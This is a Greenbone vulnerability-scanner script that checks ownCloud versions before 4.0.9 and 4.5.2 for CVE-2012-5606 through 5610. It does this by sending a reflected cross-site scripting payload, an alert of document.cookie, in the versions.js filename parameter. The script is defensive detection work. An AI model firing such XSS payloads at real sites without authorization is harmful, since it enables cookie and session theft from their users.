# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:owncloud:owncloud";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803741");
  script_version("2023-12-01T16:11:30+0000");
  script_cve_id("CVE-2012-5606", "CVE-2012-5607", "CVE-2012-5608", "CVE-2012-5609", "CVE-2012-5610");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-01 16:11:30 +0000 (Fri, 01 Dec 2023)");
  script_tag(name:"creation_date", value:"2013-08-21 16:55:36 +0530 (Wed, 21 Aug 2013)");
  script_name("ownCloud < 4.0.9, 4.5.x < 4.5.2 Multiple Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_owncloud_http_detect.nasl");
  script_mandatory_keys("owncloud/http/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"ownCloud is prone to cross-site scripting (XSS) and file upload
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An input passed via the filename to apps/files_versions/js/versions.js and
  apps/files/js/filelist.js and event title to 3rdparty/fullcalendar/js/fullcalendar.js is not
  properly sanitised before being returned to the user.

  - Certain unspecified input passed to apps/user_webdavauth/settings.php is not properly sanitised
  before being returned to the user.

  - An error due to the lib/migrate.php and lib/filesystem.php scripts are not properly verifying
  uploaded files.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attacker to execute
  arbitrary HTML or script code or discloses sensitive information resulting in loss of
  confidentiality.");

  script_tag(name:"affected", value:"ownCloud versions prior to 4.0.9 and 4.5.x prior to 4.5.2.");

  script_tag(name:"solution", value:"Update to version 4.0.9, 4.5.2 or later.");

  script_xref(name:"URL", value:"http://owncloud.org/changelog");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56658");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56764");
  script_xref(name:"URL", value:"http://secunia.com/advisories/51357");
  script_xref(name:"URL", value:"https://github.com/owncloud/core/commit/ce66759");
  script_xref(name:"URL", value:"https://github.com/owncloud/core/commit/e45f36c");
  script_xref(name:"URL", value:"https://github.com/owncloud/core/commit/e5f2d46");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2012/11/30/3");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = dir + "/apps/files_versions/js/versions.js?filename='><script>alert(document.cookie)</script>";

if( http_vuln_check( port:port, url:url, pattern:"><script>alert\(document\.cookie\)</script>", check_header:TRUE, extra_check:"revertFile" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
